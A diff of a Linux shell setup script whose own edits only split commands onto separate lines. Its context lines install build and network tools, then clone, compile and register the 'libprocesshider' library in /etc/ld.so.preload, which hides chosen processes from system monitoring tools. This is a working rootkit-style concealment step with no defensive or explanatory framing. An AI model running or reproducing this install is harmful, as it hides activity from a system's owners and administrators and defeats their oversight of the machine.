@@ -1,5 +1,6 @@
 #!/bin/sh
-apt update;apt install -y curl unzip autoconf git cmake binutils build-essential net-tools screen golang nano tar wget
+apt update
+apt install -y curl unzip autoconf git cmake binutils build-essential net-tools screen golang nano tar wget
 
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 
@@ -26,7 +27,8 @@ echo " "
 echo " "
 
 git clone https://github.com/hanifgz/libprocesshider.git
-cd libprocesshider;make
+cd libprocesshider
+make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 cd ..
